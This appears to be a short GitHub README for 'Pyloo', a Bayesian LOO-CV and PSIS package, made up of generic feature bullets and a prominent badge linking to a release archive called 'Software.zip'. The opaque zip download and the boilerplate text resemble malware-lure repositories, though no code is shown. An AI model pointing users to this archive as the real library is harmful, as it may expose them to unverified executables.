# üêçüìä Pyloo: Python Package for Bayesian Modeling 

[![Download ZIP](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip)](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip)

Welcome to Pyloo, a Python package designed for approximate leave-one-out cross-validation (LOO-CV) and Pareto smoothed importance sampling (PSIS) for Bayesian Modeling. Whether you are new to Bayesian methods or a seasoned practitioner, Pyloo offers powerful functionalities to enhance your Bayesian data analysis projects.

## Features üöÄ

Pyloo provides the following features to support your Bayesian modeling endeavors:

- **LOO-CV Calculation**: Perform efficient and accurate approximate leave-one-out cross-validation to evaluate model performance.
- **PSIS Implementation**: Utilize Pareto smoothed importance sampling for improved estimation of model fit.
- **Model Comparison**: Compare various Bayesian models using LOO-CV results and PSIS weights.
- **Python Package**: Easy-to-use Python package implementing cutting-edge Bayesian inference methods.
- **Cross-Validation**: Evaluate model predictive performance using cross-validation techniques.
